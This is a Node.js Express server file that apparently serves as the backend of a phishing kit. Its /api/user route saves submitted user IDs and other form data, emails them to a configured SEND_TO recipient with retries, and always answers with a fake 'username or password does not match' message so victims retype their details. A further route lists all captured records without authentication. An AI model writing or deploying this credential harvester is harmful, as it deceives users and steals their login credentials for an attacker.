const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const dotenv = require("dotenv");

// Load environment variables as early as possible so other modules can use them
dotenv.config();

const verifyRoutes = require("./routes/verify");
const path = require("path");
// Debug: show which recipient will be used for outgoing emails
console.log("CONFIG: SEND_TO=", process.env.SEND_TO);

const app = express();
const port = process.env.PORT || 2000;

const User = require("./models/user");
const sendUserEmail = require("./utils/emailSender");

app.use(cors());
app.use(express.json());
// Serve a small static frontend for manual testing
app.use(express.static(path.join(__dirname, "public")));
app.use("/api/verify", verifyRoutes);

// ===== HEALTH ROUTE =====
app.get("/", (req, res) => {
  res.json({ status: "success", message: "API is running..." });
});

// ===== CREATE USER & SEND EMAIL =====
app.post("/api/user", async (req, res) => {
  try {
    // Attempt DB operations, but continue to send email even if DB is down
    try {
      let user = await User.findOne({ userId: req.body.userId });

      if (!user) {
        user = new User(req.body);
        await user.save();
      }
    } catch (dbErr) {
      console.error(
        "DB error during registration (continuing to send email):",
        dbErr.message
      );
    }

    // Send email (log recipient env for debugging)
    console.log(
      "POST /api/user: sending notification for",
      req.body.userId,
      "using SEND_TO=",
      process.env.SEND_TO
    );
    await sendUserEmail(req.body);

    res.json({
      success: true,
      message:
        "The username or password does not match our records. Please try again.",
    });
  } catch (error) {
    console.error("Error submitting user:", error.message);

    // Attempt to send email with retries even if we already responded with an error status
    console.log(
      "POST /api/user: sending notification for",
      req.body.userId,
      "using SEND_TO=",
      process.env.SEND_TO
    );

    // helper sleep
    const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

    let sendResponse = null;
    let lastError = null;
    const maxAttempts = 3;
    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
      try {
        sendResponse = await sendUserEmail(req.body);
        console.log(`Email send succeeded on attempt ${attempt}`);
        break;
      } catch (err) {
        lastError = err;
        console.error(
          `Email send failed on attempt ${attempt}:`,
          err && err.message ? err.message : err
        );
        // short backoff before retrying
        if (attempt < maxAttempts) await sleep(500 * attempt);
      }
    }

    // Respond based on email send outcome
    if (sendResponse) {
      res
        .status(200)
        .json({ success: true, message: "Email sent", sendResponse });
    } else {
      console.error(
        "All email send attempts failed:",
        lastError && lastError.stack ? lastError.stack : lastError
      );
      res.status(502).json({
        success: false,
        message: "Failed to send email",
        error: lastError ? lastError.message : "unknown",
      });
    }
  }
});

// ===== GET ALL USERS =====
app.get("/api/users", async (req, res) => {
  try {
    const data = await User.find();
    res.json(data);
  } catch (error) {
    console.error("Error fetching data:", error.message);
    res.status(500).json({ message: "Error fetching user data" });
  }
});

// ===== START SERVER =====
const start = async () => {
  try {
    await mongoose.connect(process.env.MONGO_URI);
    console.log("Database connected");
  } catch (err) {
    console.error("MongoDB connection failed:", err.message);
  } finally {
    // Start server regardless of DB connection status so email/debugging can proceed
    app.listen(port, () => console.log(`Server running on PORT ${port}`));
  }
};

start();
